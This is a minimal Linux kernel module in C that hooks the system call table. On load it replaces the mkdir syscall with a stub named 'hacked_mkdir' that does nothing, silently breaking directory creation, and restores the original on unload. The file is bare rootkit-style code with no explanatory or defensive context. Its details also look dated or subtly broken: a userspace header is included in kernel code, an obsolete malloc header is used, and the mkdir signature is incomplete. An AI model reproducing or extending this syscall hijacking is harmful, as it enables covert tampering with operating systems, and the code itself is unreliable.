#include <linux/module.h>  
#include <linux/kernel.h>  
#include <asm/unistd.h>  
#include <sys/syscall.h>  
#include <linux/types.h>  
#include <linux/dirent.h>  
#include <linux/string.h>  
#include <linux/fs.h>  
#include <linux/malloc.h>  

MODULE_LICENSE("GPL");  

extern void* sys_call_table[]; 

int (*orig_mkdir) (const char *path); 

int hacked_mkdir (const char *path) {  
    return 0;  
}  

int init_module (void) {  
    orig_mkdir = sys_call_table[SYS_mkdir];  
    sys_call_table[SYS_mkdir] = hacked_mkdir;

    return 0;  
}  

void cleanup_module (void) {  
    sys_call_table[SYS_mkdir] = orig_mkdir;  
}  